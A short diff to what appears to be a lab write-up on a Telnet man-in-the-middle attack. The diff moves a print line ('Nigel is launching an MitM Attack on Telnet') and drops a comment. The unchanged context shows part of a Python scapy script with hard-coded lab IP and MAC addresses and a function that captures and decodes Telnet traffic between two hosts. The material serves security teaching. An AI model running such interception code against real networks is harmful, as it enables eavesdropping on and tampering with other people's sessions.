@@ -133,8 +133,9 @@ Additionally, the code prints "Nigel is launching an MitM Attack on Telnet" to t
 ```
 #!/usr/bin/env python3
 from scapy.all import *
-# https://docs.python.org/3/library/re.html [regular expressions]
 import re
+
+print("Nigel is launching an MitM Attack on Telnet")
 
 # Set the target IP addresses
 target_a_ip = '10.9.0.5'
@@ -147,7 +148,6 @@ host_m_mac = '02:42:0a:09:00:69'
 
 # Define the Telnet data modification function
 def modify_telnet_data(pkt):
-    print("Nigel is launching an MitM Attack on Telnet")
     if IP in pkt and TCP in pkt and pkt[IP].src == target_a_ip and pkt[IP].dst == target_b_ip:
         # Extract the Telnet data from the TCP packet
         telnet_data = pkt[TCP].payload.load.decode(errors='ignore')
